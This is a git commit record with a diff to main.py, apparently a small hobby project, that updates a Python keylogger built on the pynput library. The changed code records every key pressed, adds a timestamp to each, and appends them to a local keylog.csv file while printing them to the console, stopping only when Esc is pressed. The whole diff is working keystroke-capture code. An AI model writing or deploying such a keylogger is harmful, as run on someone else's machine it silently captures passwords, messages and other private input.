4b4e55a58bd0ebb79dfd527a71563150eb907a73
Elgun1234 <112864674+Elgun1234@users.noreply.github.com>
2023-01-05 09:43:26 +0000

    Update main.py

--- main.py
+++ main.py
@@ -1,33 +1,43 @@
 from pynput import keyboard
+import datetime
+
+list = []
 
 def on_press(key):
     try:
-        print('alphanumeric key {0} pressed'.format(
-            key.char))
+        x = datetime.datetime.now()
+        dt = x.strftime("%Y-%m-%d %H:%M:%S")
+        print(key.char)
+        print(type(key))
         f = open("keylog.csv", "a")
-        f.write(f"{key} pressed\n")
+        f.write(f"{dt}  |  {key.char} \n")
+
+
 
 
     except AttributeError:
-        print('special key {0} pressed'.format(
-            key))
+        x = datetime.datetime.now()
+        dt = x.strftime("%Y-%m-%d %H:%M:%S")
+        print(f"{key}")
         f = open("keylog.csv", "a")
-        f.write(f"{key} pressed\n")
+        print(type(key))
+        f.write(f"{dt}  |  {key}\n")
+
 
 def on_release(key):
-    print('{0} released'.format(
-        key))
-    f = open("keylog.csv", "a")
-    f.write(f"{key} released\n")
     if key == keyboard.Key.esc:
         # Stop listener
         return False
 
+
 # Collect events until released
 with keyboard.Listener(
         on_press=on_press,
-        on_release=on_release) as listener:
+        on_release=on_release
+        ) as listener:
     listener.join()
+    print(list)
+
 
 # ...or, in a non-blocking fashion:
 '''
